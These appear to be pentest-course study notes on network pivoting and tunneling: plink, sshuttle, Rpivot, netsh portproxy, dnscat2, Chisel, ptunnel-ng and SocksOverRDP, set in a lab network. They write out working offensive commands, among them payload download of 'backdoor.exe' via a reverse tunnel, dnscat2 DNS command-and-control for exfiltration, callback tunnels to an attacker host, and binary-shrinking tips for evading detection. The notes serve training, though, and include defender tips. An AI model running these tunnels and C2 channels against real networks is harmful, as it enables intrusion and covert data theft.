- **Goal**: Use `plink.exe` for port forwarding and Proxifier for dynamic SOCKS proxy routing to access internal services or deliver payloads.

**3. Steps for Local Port Forwarding with Plink.exe**:
- **Objective**: Forward an internal service (e.g., SMB on 172.16.5.20:445) to the attack host via the Windows pivot and Ubuntu SSH server.
- **Command**:
  - On the Windows pivot (172.16.5.19):
    - `plink.exe -ssh -l ubuntu -pw Password123 -L 4450:172.16.5.20:445 10.129.202.64`
    - Establishes a local SSH tunnel:
      - `-L 4450:172.16.5.20:445`: Binds port 4450 on the attack host to 172.16.5.20:445 via the SSH server.
      - `-l ubuntu -pw Password123`: Authenticates to the Ubuntu SSH server (10.129.202.64).
- **Usage**:
  - On the attack host, access the service:
    - `smbclient -L //localhost:4450 -U victor%pass@123`
    - Connects to the SMB service on 172.16.5.20:445 through the tunnel.
- **Key Insight**: Local forwarding allows the attack host to access internal services as if they were local, using the Windows pivot as a relay.

**4. Steps for Reverse Port Forwarding with Plink.exe**:
- **Objective**: Expose a service on the attack host (e.g., a web server hosting a payload) to the internal network via the Windows pivot and SSH server.
- **Command**:
  - On the Windows pivot (172.16.5.19):
    - `plink.exe -ssh -l ubuntu -pw Password123 -R 8123:localhost:8123 10.129.202.64`
    - Establishes a reverse SSH tunnel:
      - `-R 8123:localhost:8123`: Binds port 8123 on the SSH server (10.129.202.64) to port 8123 on the attack host.
      - `localhost` refers to the attack host (10.10.14.18) from the perspective of the SSH connection.
- **Setup on Attack Host**:
  - Start a web server: `python3 -m http.server 8123`
  - Hosts a payload (e.g., `backdoor.exe`).
- **Usage**:
  - On an internal target (e.g., 172.16.5.20):
    - `curl http://10.129.202.64:8123/backdoor.exe -o backdoor.exe`
    - Downloads the payload from the attack host via the SSH server’s port 8123.
- **Key Insight**: Reverse forwarding makes the attack host’s service accessible to internal hosts, facilitating payload delivery.

**5. Steps for Dynamic Port Forwarding with Plink.exe and Proxifier**:
- **Objective**: Route arbitrary traffic through the Windows pivot and SSH server to access multiple internal services dynamically.
- **Command**:
  - On the Windows pivot (172.16.5.19):
    - `plink.exe -ssh -l ubuntu -pw Password123 -D 9050 10.129.202.64`
    - Establishes a dynamic SSH tunnel:
      - `-D 9050`: Creates a SOCKS proxy listener on localhost:9050 on the attack host.
- **Configure Proxifier on Attack Host**:
  - Install Proxifier (a proxy client for Windows/Linux).
  - Add a SOCKS proxy:
    - Address: 127.0.0.1, Port: 9050, Protocol: SOCKS Version 5.
  - Set Proxifier to route traffic (e.g., Nmap, xfreerdp) through the proxy.
- **Usage**:
  - Scan internal network:
    - `proxychains nmap -sT -p445 172.16.5.20`
    - Routes Nmap traffic through the SOCKS proxy to scan 172.16.5.20:445.
  - Access RDP:
    - `xfreerdp /v:172.16.5.20:3389 /u:victor /p:pass@123`
    - Proxifier routes the RDP connection through the SOCKS proxy.
- **Key Insight**: Dynamic forwarding with Proxifier enables flexible access to multiple internal services, similar to SSH `-D` with `proxychains` on Linux.

**6. Practical Application**:
- **Service Access**: Use local forwarding to reach internal services (e.g., SMB, RDP) from the attack host.
- **Payload Delivery**: Use reverse forwarding to expose payloads hosted on the attack host to internal targets.
- **Network Enumeration**: Use dynamic forwarding with Proxifier to scan or interact with multiple internal hosts/services.
- **Example Workflow**:
  - Compromise the Windows pivot host and upload `plink.exe`.
  - Establish SSH tunnels (local, reverse, or dynamic) to the Ubuntu SSH server.
  - Use Proxifier for dynamic routing or direct connections for specific services/payloads.

**Key Takeaways**:
- **Plink.exe**: A command-line SSH client for Windows, supporting `-L` (local), `-R` (reverse), and `-D` (dynamic) port forwarding.
- **Local Forwarding**: Maps internal services to the attack host (e.g., `4450:172.16.5.20:445`).
- **Reverse Forwarding**: Exposes attack host services to internal hosts (e.g., `8123:localhost:8123`).
- **Dynamic Forwarding**: Uses `-D` with Proxifier to route arbitrary traffic through a SOCKS proxy (e.g., 127.0.0.1:9050).
- **Proxifier**: Enhances dynamic forwarding by routing Windows applications (e.g., Nmap, xfreerdp) through the SOCKS proxy.
- **Workflow**:
  - Upload `plink.exe` to the Windows pivot.
  - Set up SSH tunnels to the Ubuntu SSH server.
  - Configure Proxifier for dynamic access or use direct connections for specific tasks.

**Security Tips**:
- Monitor Windows hosts for `plink.exe` processes or unusual SSH connections.
- Restrict SSH server access (e.g., key-based authentication, IP whitelisting).
- Block non-standard ports (e.g., 4450, 8123, 9050) on pivot hosts and SSH servers.
- Use endpoint detection to identify unauthorized binaries (e.g., `plink.exe`).
- Audit network traffic for unexpected SOCKS proxy or SSH tunnel activity.

**Limitations**:
- Requires `plink.exe` to be uploaded to the Windows pivot.
- Depends on SSH server access (e.g., valid credentials for 10.129.202.64).
- Proxifier is Windows/Linux-specific; alternative proxy clients may be needed for other platforms.
- Dynamic forwarding requires additional configuration (Proxifier setup).

### Notes on SSH Pivoting with Sshuttle

**Overview**:
- Focuses on using `sshuttle`, a Python-based tool, to simplify SSH pivoting by routing traffic through an Ubuntu pivot host (e.g., 10.129.202.64) to access internal network services (e.g., 172.16.5.0/23) without requiring manual `proxychains` configuration.

**1. Sshuttle Overview**:
- **Definition**: `sshuttle` is a transparent proxy server that routes traffic over an SSH connection, automating iptables rules for pivoting.
- **Use Case**: Enables the attack host to access internal network services (e.g., RDP on 172.16.5.19:3389) through a compromised Ubuntu pivot host.
- **Key Insight**: Unlike `proxychains`, `sshuttle` eliminates the need for manual proxy configuration, but it is limited to SSH-based pivoting (no support for TOR or HTTPS proxies).

**2. Scenario Setup**:
- **Attack Host**: Running `sshuttle` to route traffic (e.g., 10.10.14.18).
- **Pivot Host**: Ubuntu server (10.129.202.64) with SSH access, acting as the relay.
- **Target**: Windows host (172.16.5.19) in the internal network (172.16.5.0/23), running services like RDP.
- **Goal**: Use `sshuttle` to route Nmap scans or RDP connections to the internal network via the pivot host.

**3. Steps to Use Sshuttle for Pivoting**:
- **Step 1: Install Sshuttle on Attack Host**:
  - Command:
    - `sudo apt-get install sshuttle`
    - Installs `sshuttle` (version 1.0.5-1, 91.8 kB archive, 508 kB disk space).
    - Dependencies and package cleanup suggestions provided (e.g., `sudo apt autoremove`).
- **Step 2: Run Sshuttle to Route Traffic**:
  - Command:
    - `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v`
    - Options:
      - `-r ubuntu@10.129.202.64`: Connects to the pivot host using SSH credentials (prompts for password).
      - `172.16.5.0/23`: Specifies the internal network to route through the pivot.
      - `-v`: Enables verbose output for debugging.
    - Execution Details:
      - Starts `sshuttle` proxy (version 1.1.0) with Python 3.9.2.
      - Configures iptables and ip6tables for NAT redirection.
      - Listens on `127.0.0.1:12300` and `::1:12300` for TCP redirection.
      - Routes traffic to 172.16.5.0/23, excluding local addresses (e.g., 127.0.0.1, ::1).
      - Sets up firewall rules to redirect traffic to port 12300.
- **Step 3: Test Traffic Routing**:
  - Command:
    - `nmap -v -sV -p3389 172.16.5.19 -A -Pn`
    - Scans the Windows target (172.16.5.19:3389) through the `sshuttle` tunnel.
  - Result:
    - Confirms RDP (Microsoft Terminal Services) on 172.16.5.19:3389.
    - Provides service details: OS (Windows), domain (inlanefreight.local), computer name (DC01), product version (10.0.17763).
    - Includes SSL certificate and NTLM information.
  - Alternative Use:
    - Connect to RDP: `xfreerdp /v:172.16.5.19:3389 /u:victor /p:pass@123`
    - Routes the RDP connection through the pivot host seamlessly.
- **Key Insight**: `sshuttle` automates iptables rules, making pivoting as simple as routing traffic to the specified network (172.16.5.0/23) without additional proxy tools.

**4. Practical Application**:
- **Network Enumeration**: Route Nmap scans through the pivot host to discover internal services (e.g., RDP, SMB).
- **Service Access**: Connect to internal services like RDP or SMB without manual port forwarding.
- **Example Workflow**:
  - Compromise the Ubuntu pivot host and ensure SSH access.
  - Install `sshuttle` on the attack host.
  - Run `sshuttle` to route traffic to the internal network (172.16.5.0/23).
  - Perform scans or connect to services (e.g., RDP on 172.16.5.19) directly.

**Key Takeaways**:
- **Sshuttle**: A Python-based tool that simplifies SSH pivoting by automating iptables rules for traffic routing.
- **Command**: `sudo sshuttle -r <user>@<pivot_ip> <internal_network> -v` routes traffic to the specified network (e.g., 172.16.5.0/23).
- **Advantages**:
  - Eliminates the need for `proxychains` or manual proxy configuration.
  - Transparent routing for tools like Nmap and xfreerdp.
  - Supports IPv4 and IPv6 (though UDP and DNS routing are disabled by default with NAT method).
- **Workflow**:
  - Install `sshuttle` on the attack host.
  - Run `sshuttle` with SSH credentials and target network.
  - Access internal services or scan the network directly.
- **Limitations**:
  - Only supports SSH-based pivoting (no TOR or HTTPS proxy support).
  - Requires SSH access to the pivot host.
  - May require sudo privileges for iptables manipulation.

**Security Tips**:
- Restrict SSH access on pivot hosts (e.g., key-based authentication, IP whitelisting).
- Monitor for `sshuttle` processes or unusual iptables rules on attack or pivot hosts.
- Block unauthorized traffic to internal networks (e.g., 172.16.5.0/23).
- Audit SSH logs for unexpected connections from attack hosts.
- Use network monitoring to detect abnormal routing patterns.

**Limitations**:
- Requires `sshuttle` installation on the attack host.
- Pivot host must have SSH server running and accessible.
- Limited to TCP traffic with NAT method (UDP and DNS routing unavailable by default).
- Performance may degrade with large networks or high traffic volumes.

### Notes on Web Server Pivoting with Rpivot

**Overview**:
- Focuses on using `Rpivot`, a Python-based tool, to establish a SOCKS proxy tunnel through a compromised web server (e.g., 10.129.202.64) to pivot into an internal network (e.g., 172.16.5.0/23) and access services like a web server on 172.16.5.135:80.

**1. Rpivot Overview**:
- **Definition**: `Rpivot` creates a SOCKS proxy tunnel by running a server component on the attack host and a client component on the compromised pivot host, facilitating network pivoting without SSH.
- **Use Case**: Enables access to internal network services (e.g., HTTP on 172.16.5.135:80) through a web server pivot when SSH or other tunneling methods are unavailable.
- **Key Insight**: `Rpivot` leverages HTTP/HTTPS connections, making it suitable for pivoting through web servers with HTTP-based access.

**2. Scenario Setup**:
- **Attack Host**: 10.10.14.18, running the `Rpivot` server on port 9999.
- **Pivot Host**: Ubuntu web server (10.129.202.64), running the `Rpivot` client to connect to the attack host.
- **Target**: Internal web server (172.16.5.135:80) in the internal network (172.16.5.0/23).
- **Goal**: Use `Rpivot` to create a SOCKS proxy tunnel and access the internal web server via `proxychains` and a browser (e.g., Firefox ESR).

**3. Steps to Use Rpivot for Pivoting**:
- **Step 1: Run Rpivot Server on Attack Host**:
  - Command:
    - `python server.py --server-port 9999 --server-ip 0.0.0.0`
    - Starts the `Rpivot` server on 0.0.0.0:9999, listening for connections from the pivot host.
  - Output:
    - Confirms the server is running and listening on 10.10.14.18:9999.
- **Step 2: Run Rpivot Client on Pivot Host**:
  - Command:
    - `python client.py --server-ip 10.10.14.18 --server-port 9999`
    - Executes the `Rpivot` client on the Ubuntu web server (10.129.202.64), connecting back to the attack host’s server.
  - Output:
    - Confirms connection from 10.129.202.64:35226, establishing the tunnel.
- **Step 3: Configure Proxychains on Attack Host**:
  - Edit `/etc/proxychains.conf`:
    - Set `socks4 127.0.0.1 9050` (or appropriate port if specified in `Rpivot` server).
  - Ensure the `Rpivot` server’s SOCKS proxy port (e.g., 9050) is correctly configured.
- **Step 4: Access Internal Web Server**:
  - Command:
    - `proxychains firefox-esr 172.16.5.135:80`
    - Launches Firefox ESR through `proxychains`, routing traffic via the `Rpivot` SOCKS proxy to access the web server on 172.16.5.135:80.
  - Output:
    - Displays the default Apache2 Ubuntu welcome page, confirming access to the internal web server.
    - `proxychains` logs show DNS requests (e.g., detectportal.firefox.com, example.org) and successful connections via 127.0.0.1:9050.
- **Step 5: Optional NTLM Authentication for Proxy**:
  - Command:
    - `python client.py --server-ip 10.10.14.18 --server-port 8080 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8081`
    - Configures the `Rpivot` client to use an NTLM-authenticated proxy (e.g., for environments requiring proxy authentication).
  - Use Case: Routes traffic through an NTLM proxy for environments with strict outbound filtering.

**4. Practical Application**:
- **Web Server Access**: Use `Rpivot` to access internal HTTP/HTTPS services through a compromised web server.
- **Network Enumeration**: Route tools like Nmap or curl through the SOCKS proxy to scan or interact with internal hosts.
- **Example Workflow**:
  - Compromise the Ubuntu web server and upload the `Rpivot` client script.
  - Start the `Rpivot` server on the attack host.
  - Run the `Rpivot` client on the pivot host to establish the SOCKS tunnel.
  - Configure `proxychains` and access internal services (e.g., 172.16.5.135:80) via browser or other tools.

**Key Takeaways**:
- **Rpivot**: A Python-based tool for creating SOCKS proxy tunnels through web servers, using `server.py` on the attack host and `client.py` on the pivot host.
- **Command**:
  - Server: `python server.py --server-port 9999 --server-ip 0.0.0.0`
  - Client: `python client.py --server-ip 10.10.14.18 --server-port 9999`
- **Proxychains**: Routes traffic through the `Rpivot` SOCKS proxy (e.g., 127.0.0.1:9050) for tools like Firefox or Nmap.
- **NTLM Support**: Supports NTLM-authenticated proxies for restricted environments.
- **Advantages**:
  - Works over HTTP/HTTPS, bypassing SSH dependencies.
  - Lightweight and easy to deploy on compromised web servers.
  - Flexible for accessing multiple internal services via SOCKS.
- **Workflow**:
  - Deploy `Rpivot` server on attack host and client on pivot host.
  - Configure `proxychains` for SOCKS proxy.
  - Access internal services or enumerate the network.

**Security Tips**:
- Monitor web servers for unauthorized Python scripts (e.g., `client.py`, `server.py`).
- Restrict outbound connections from web servers to unknown IPs (e.g., 10.10.14.18:9999).
- Block non-standard ports (e.g., 9050, 9999) on pivot hosts.
- Use web application firewalls to detect and block malicious script execution.
- Audit network traffic for unexpected SOCKS proxy activity or HTTP connections.

**Limitations**:
- Requires Python on the pivot host to run `client.py`.
- Pivot host must allow outbound connections to the attack host (e.g., 10.10.14.18:9999).
- Relies on `proxychains` for routing non-browser tools, which may require additional configuration.
- NTLM proxy support may be complex to configure in some environments.

# Notes on Port Forwarding with Windows Netsh

## Overview
- **Netsh (Network Shell)**: Command-line utility for configuring/managing Windows network settings.
- Used for port forwarding, firewall configuration, network interface setup, and diagnostics.

## Key Networking Tasks with Netsh
- **Firewall Configuration**: Manage Windows Firewall rules for ports/applications.
- **Port Forwarding**: Redirect incoming traffic to specific IP/port.
- **Network Interface Configuration**: Configure adapters, IP, DNS, etc.
- **Diagnostics/Monitoring**: View network status or troubleshoot issues.

## Port Forwarding with Netsh
- **Purpose**: Enable external access to local network services by redirecting traffic.
- **Command Context**: `netsh interface portproxy`
  - Requires admin privileges.

### Syntax
```cmd
netsh interface portproxy add v4tov4 listenport=<port> listenaddress=<IP> connectport=<port> connectaddress=<IP>
```
- **listenport**: Local port receiving traffic.
- **listenaddress**: Local IP listening (e.g., `0.0.0.0` for all interfaces).
- **connectport**: Destination port for forwarded traffic.
- **connectaddress**: Destination IP for forwarded traffic.

### Example
Forward port `8080` to `192.168.1.100:80`:
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100
```

### View Rules
```cmd
netsh interface portproxy show all
```

### Delete Rule
```cmd
netsh interface portproxy delete v4tov4 listenport=<port> listenaddress=<IP>
```

## Prerequisites
- Run Command Prompt/PowerShell as Administrator.
- Ensure IPv4/IPv6 support for protocol (e.g., `v4tov4`).
- Configure firewall to allow traffic on `listenport`.

## Firewall Configuration
Allow traffic on specific port (e.g., `8080`):
```cmd
netsh advfirewall firewall add rule name="Allow Port 8080" dir=in action=allow protocol=TCP localport=8080
```

## Limitations
- `netsh portproxy` supports TCP only.
- System-level forwarding, not a router replacement.

## Troubleshooting
- Verify destination service is running (`telnet` or `Test-NetConnection`).
- Check firewall settings for conflicts.
- Confirm rules with `netsh interface portproxy show all`.

## Use Cases
- Host web/game servers locally with external access.
- Redirect traffic for testing/development.
- Access internal services remotely.

# Notes on DNS Tunneling with Dnscat2

## Overview
- **Dnscat2**: Tunneling tool using DNS protocol to transmit data between hosts.
- **Purpose**: Creates encrypted C2 channel, embedding data in DNS TXT records for stealthy exfiltration.
- **Stealth**: Bypasses firewalls via DNS traffic, often allowed in corporate networks.

## How Dnscat2 Works
- **Corporate DNS**: Internal DNS servers resolve hostnames, forwarding external queries.
- **Process**:
  - Client sends DNS queries to external Dnscat2 server.
  - Data hidden in TXT records, mimicking legitimate DNS traffic.
  - External server processes tunneled data.

## Setting Up Dnscat2

### Attack Host: Dnscat2 Server
1. **Clone Repository**:
   ```bash
   git clone https://github.com/iagox86/dnscat2.git
   cd dnscat2/server/
   ```
2. **Install Dependencies**:
   ```bash
   sudo gem install bundler
   sudo bundle install
   ```
3. **Start Server**:
   ```bash
   ruby dnscat2.rb
   ```
   - Runs on `10.10.14.18:53` (UDP port 53) for `inlanefreight.local`.
   - Generates pre-shared secret (e.g., `0ec04a91cd1e963f8c03ca499d589d21`).
   - Enforces encrypted connections.

### Target Host: Dnscat2 Client (Windows)
1. **Standard Client**:
   - Run with domain and secret:
     ```bash
     ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
     ```
   - Or direct IP:
     ```bash
     ./dnscat --dns server=10.10.14.18,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
     ```
2. **PowerShell Client**:
   - **Clone**:
     ```bash
     git clone https://github.com/lukebaggett/dnscat2-powershell
     ```
   - Transfer `dnscat2.ps1` to target.
   - **Import**:
     ```powershell
     Import-Module .\dnscat2.ps1
     ```
   - **Start**:
     ```powershell
     Start-Dnscat2 -DNSServer 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21
     ```

### Confirming Session
- **Server Output**:
  ```
  New window created: 1
  Session 1 Security: ENCRYPTED AND VERIFIED!
  ```
- Security depends on pre-shared secret strength.

## Interacting with Dnscat2
1. **List Commands**:
   - Type `?` at `dnscat2>` prompt:
     - `echo`, `help`, `kill`, `quit`, `set`, `start`, `stop`, `tunnels`, `unset`, `window`, `windows`
2. **Interact**:
   - Switch to session:
     ```bash
     window -i 1
     ```
   - Access CMD shell:
     ```
     Microsoft Windows [Version 10.0.18363.1801]
     C:\Windows\system32>
     ```
   - Run commands (e.g., `pwd`); use `Ctrl+Z` to return.

## Use Cases
- Data exfiltration.
- Command and control.
- Bypassing firewalls.
- Penetration testing.

## Limitations
- DNS traffic may be detected by advanced monitoring.
- Weak secrets reduce encryption security.
- Setup requires DNS server and client deployment.

# Notes on SOCKS5 Tunneling with Chisel

## Overview
- **Chisel**: TCP/UDP-based tunneling tool written in Go, using HTTP and SSH for secure data transport.
- **Purpose**: Creates client-server tunnels to bypass firewall restrictions, enabling access to internal networks.
- **Scenario**: Tunnel traffic to an internal webserver (172.16.5.0/23) via a compromised Ubuntu server (pivot host) to reach a Domain Controller (172.16.5.19).

## How Chisel Works
- **Setup**: Chisel server on a pivot host forwards traffic to internal networks; client on attack host connects to the server.
- **SOCKS5**: Provides a proxy for routing traffic to internal hosts (e.g., 172.16.5.19) from an external attack host.

## Setting Up Chisel

### Attack Host: Preparing Chisel
1. **Clone Repository**:
   ```bash
   git clone https://github.com/jpillora/chisel.git
   ```
2. **Install Go**: Required to build Chisel binary.
3. **Build Binary**:
   ```bash
   cd chisel
   go build
   ```
   - **Note**: Minimize binary size for stealth (see 0xpat’s blog or IppSec’s Reddish walkthrough at 24:29).
4. **Transfer Binary to Pivot Host**:
   ```bash
   scp chisel ubuntu@10.129.202.64:/
   ```

### Pivot Host: Running Chisel Server
- **Start Server**:
   ```bash
   ./chisel server -v -p 1234 --socks5
   ```
   - Listens on port 1234 with SOCKS5.
   - Forwards traffic to networks accessible from pivot host (e.g., 172.16.5.0/23).
   - **Output**:
     ```
     2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
     ```

### Attack Host: Connecting Chisel Client
- **Start Client**:
   ```bash
   ./chisel client -v ws://10.129.202.64:1234 socks
   ```
   - Connects to pivot host’s server on port 1234.
   - **Output**:
     ```
     2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
     2022/05/05 14:21:18 client: Connected
     ```

## Using SOCKS5 Proxy
1. **Configure Proxychains**:
   - Edit `/etc/proxychains.conf`:
     ```
     [ProxyList]
     socks5 127.0.0.1 1080
     ```
2. **Access Internal Network**:
   - Use `proxychains` with RDP to connect to Domain Controller:
     ```bash
     proxychains xfreerdp /v:172.16.5.19 /u:victor /p:passel29
     ```

## Reverse Pivot with Chisel
- **Purpose**: Use when inbound connections to pivot host are blocked by firewalls.
- **Setup**: Run Chisel server on attack host, client on pivot host.

### Attack Host: Reverse Chisel Server
- **Start Server**:
   ```bash
   sudo ./chisel server --reverse -v -p 1234 --socks5
   ```
   - Enables reverse tunneling.
   - **Output**:
     ```
     2022/05/30 10:19:16 server: Reverse tunnelling enabled
     2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
     ```

### Pivot Host: Reverse Chisel Client
- **Start Client**:
   ```bash
   ./chisel client -v 10.10.14.17:1234 R:socks
   ```
   - Connects to attack host, enabling SOCKS5 proxy on server’s default port (1080).
   - **Output**:
     ```
     2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
     ```

## Proxychains Configuration (Reverse)
- **Edit `/etc/proxychains.conf`**:
  ```
  [ProxyList]
  socks5 127.0.0.1 1080
  ```
- **Access Internal Network**:
  - Use `proxychains` with RDP (same as forward pivot).

## Troubleshooting
- **Chisel Errors**: Try a different Chisel version if errors occur on the target.
- **Firewall Restrictions**: Use reverse pivot for restrictive environments.
- **Binary Size**: Shrink binary to reduce detection risk.

## Use Cases
- Access internal network hosts (e.g., Domain Controller) from an external attack host.
- Bypass firewall restrictions for penetration testing.
- Pivot through compromised hosts to deeper network segments.

## Notes
- **Stealth**: Minimize binary size and monitor transfer sizes to avoid detection.
- **Resources**:
  - 0xpat’s blog: “Tunneling with Chisel and SSF.”
  - IppSec’s Reddish walkthrough (Chisel at 24:29).
- **Authentication**: Supports HTTP “basic” and SOCKS “user/pass” authentication.

# Notes on ICMP Tunneling with SOCKS

## Overview
- **Purpose**: Use ICMP (ping) protocol to tunnel TCP traffic, bypassing firewalls that allow ICMP but block other protocols.
- **Tool**: `ptunnel-ng`, an ICMP tunneling tool to establish a SOCKS proxy for pivoting to internal networks.
- **Scenario**: Tunnel SSH or other traffic to a target (e.g., 10.129.202.64) or internal host (e.g., 172.16.5.19) via a compromised host.

## How ICMP Tunneling Works
- **Mechanism**: Encapsulates TCP traffic within ICMP echo request/reply packets.
- **Setup**: Server on compromised host forwards traffic; client on attack host connects to the server.
- **Stealth**: ICMP is often unfiltered, making it ideal for evading network restrictions.

## Setting Up ptunnel-ng

### Attack Host: Install ptunnel-ng
1. **Clone Repository**:
   ```bash
   git clone https://github.com/utoni/ptunnel-ng.git
   ```
2. **Build and Install**:
   ```bash
   cd ptunnel-ng
   ./autogen.sh
   ./configure
   make
   sudo make install
   ```

### Pivot Host: Run ptunnel-ng Server
- **Start Server**:
   ```bash
   sudo ptunnel-ng -r 10.129.202.64 -R 22
   ```
   - `-r`: Remote host IP (pivot host, 10.129.202.64).
   - `-R`: Remote port (e.g., 22 for SSH).
   - Forwards ICMP-tunneled traffic to the specified service.

### Attack Host: Connect to ptunnel-ng Server
- **Start Client**:
   ```bash
   sudo ./ptunnel-ng -p 10.129.202.64 -l 2222 -r 10.129.202.64 -R 22
   ```
   - `-p`: Proxy host (pivot host IP).
   - `-l`: Local port (e.g., 2222) to forward traffic.
   - `-r`, `-R`: Remote host/port (same as server).
   - **Output**:
     ```
     [inf]: Starting ptunnel-ng 1.62.
     [inf]: Relaying packets from incoming TCP streams.
     ```

## Using the ICMP Tunnel

### SSH via ICMP Tunnel
- **Connect to Target**:
   ```bash
   ssh -p 2222 -l ubuntu 127.0.0.1
   ```
   - Connects to pivot host’s SSH service (port 22) via local port 2222.
   - **Output**:
     ```
     Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-31-generic x86_64)
     ```

### SOCKS Proxy with Proxychains
1. **Configure Proxychains**:
   - Edit `/etc/proxychains.conf`:
     ```
     [ProxyList]
     socks5 127.0.0.1 9058
     ```
2. **Scan Internal Network**:
   - Use `proxychains` with `nmap` to scan internal host (e.g., 172.16.5.19):
     ```bash
     proxychains nmap -sV -sT 172.16.5.19 -p 3389
     ```
   - **Output**:
     ```
     PORT     STATE SERVICE VERSION
     3389/tcp open  ms-wbt-server Microsoft Terminal Services
     Service Info: OS: Windows
     ```

## Network Traffic Analysis Considerations
- **Stealth**: ICMP tunneling may evade basic firewalls but can be detected by deep packet inspection or unusual ICMP traffic patterns.
- **Note**: Captured traffic may reveal tunneling if analyzed (e.g., SSH over ICMP).

## Limitations
- **Performance**: ICMP tunneling is slower due to packet size limits and latency.
- **Detection**: Advanced IDS/IPS may flag excessive or irregular ICMP traffic.
- **Version Issues**: Ensure compatible `ptunnel-ng` versions; errors may require testing different builds.

## Use Cases
- Bypass firewalls blocking TCP/UDP but allowing ICMP.
- Pivot to internal networks via a compromised host.
- Establish SSH or RDP connections in restricted environments.

## Notes
- **Documentation**: Ubuntu help (https://help.ubuntu.com) referenced for pivot host.
- **Incomplete OCR**: Page 1 is mostly empty; Page 4 notes SSH tunneling specifics but is vague.
- **Environment**: Tested on Ubuntu 20.04.3 LTS (pivot host).

# Notes on RDP and SOCKS Tunneling with SocksOverRDP

## Overview
- **Purpose**: Use Remote Desktop Protocol (RDP) to tunnel SOCKS traffic, enabling pivoting to internal networks via a compromised Windows host.
- **Tool**: SocksOverRDP, a plugin for Windows RDP to create a SOCKS proxy over an RDP connection.
- **Scenario**: Establish a SOCKS proxy to access an internal host (e.g., 172.16.5.19) through a compromised Windows host (e.g., 10.129.42.198).

## How SocksOverRDP Works
- **Mechanism**: Leverages RDP’s virtual channel to tunnel SOCKS traffic, allowing external access to internal networks.
- **Setup**: Server component runs on the compromised Windows host; client component on the attack host connects via RDP.
- **SOCKS Proxy**: Routes traffic through the RDP session to reach internal network hosts.

## Setting Up SocksOverRDP

### Compromised Windows Host: Install SocksOverRDP Server
1. **Download SocksOverRDP**:
   - Obtain the server binary (e.g., from GitHub or trusted source).
   - Place in a directory (e.g., `C:\Users\htb-student\Desktop\SocksOverRDP\x64`).
2. **Run Server**:
   - Execute the SocksOverRDP server binary:
     ```cmd
     SocksOverRDP-Server.exe
     ```
   - Starts a SOCKS listener (default port: 1080).
3. **Verify Listener**:
   - Check the SOCKS listener is active:
     ```cmd
     netstat -ano | findstr 1080
     ```
     - **Output**:
       ```
       TCP    127.0.0.1:1080    0.0.0.0:0    LISTENING
       ```

### Attack Host: Configure RDP Client with SocksOverRDP
1. **Install SocksOverRDP Plugin**:
   - Download and install the SocksOverRDP client plugin on the attack host (Windows).
   - Ensure the plugin is enabled in the RDP client (e.g., `mstsc`).
2. **Connect to RDP**:
   - Use Remote Desktop Connection (`mstsc`) to connect to the compromised host:
     - Host: `10.129.42.198`
     - Username: `victor`
     - Password: (provided during connection)
   - **Note**: SocksOverRDP plugin must be enabled; a notification confirms this in the RDP dialog.
3. **Verify Connection**:
   - If RDP connection fails, troubleshoot firewall settings or plugin compatibility.

### Configure Proxifier for SOCKS Proxy
1. **Install Proxifier**:
   - Download and install Proxifier on the attack host (Windows).
2. **Set Up Proxy**:
   - Configure Proxifier to use the SOCKS proxy:
     - Proxy Server: `127.0.0.1`
     - Port: `1080`
     - Protocol: SOCKS5
3. **Route Traffic**:
   - Direct tools (e.g., `nmap`, browsers) through Proxifier to access internal hosts via the SOCKS proxy.

## Using the SOCKS Proxy
- **Access Internal Network**:
  - Example: Scan an internal host (e.g., 172.16.5.19) using `nmap` through Proxifier:
    ```cmd
    nmap -sV -sT 172.16.5.19 -p 3389
    ```
    - Routes traffic via the SOCKS proxy over RDP to the internal network.
- **Other Tools**:
  - Use Proxifier with any TCP-based tool (e.g., `xfreerdp`, web browsers) to pivot to internal hosts.

## Troubleshooting
- **RDP Connection Issues**: Ensure RDP is enabled on the target, credentials are correct, and firewalls allow port 3389.
- **SocksOverRDP Plugin**: Verify plugin compatibility with the RDP client version.
- **SOCKS Listener**: Confirm the server binary is running and listening on port 1080.
- **Proxifier Errors**: Check proxy settings and ensure the SOCKS listener is active.

## Limitations
- **Performance**: RDP tunneling may introduce latency compared to direct SOCKS proxies.
- **Detection**: RDP traffic is visible; advanced monitoring may detect unusual activity.
- **Windows Only**: SocksOverRDP requires Windows on both client and server.

## Use Cases
- Pivot to internal networks via a compromised Windows host with RDP access.
- Bypass firewalls restricting direct TCP/UDP connections.
- Perform network reconnaissance or exploitation in restricted environments.

## Notes
- **Environment**: Tested on Windows 10 (Version 10.0.18363.1801) for the compromised host.
- **Incomplete OCR**: Pages 1, 4, and 5 contain limited or unreadable content; core details extracted from Pages 2 and 3.
- **Credentials**: Example uses `victor` as the username; actual credentials depend on the compromised host.
- **Security**: Ensure secure transfer of SocksOverRDP binaries to avoid detection or compromise.
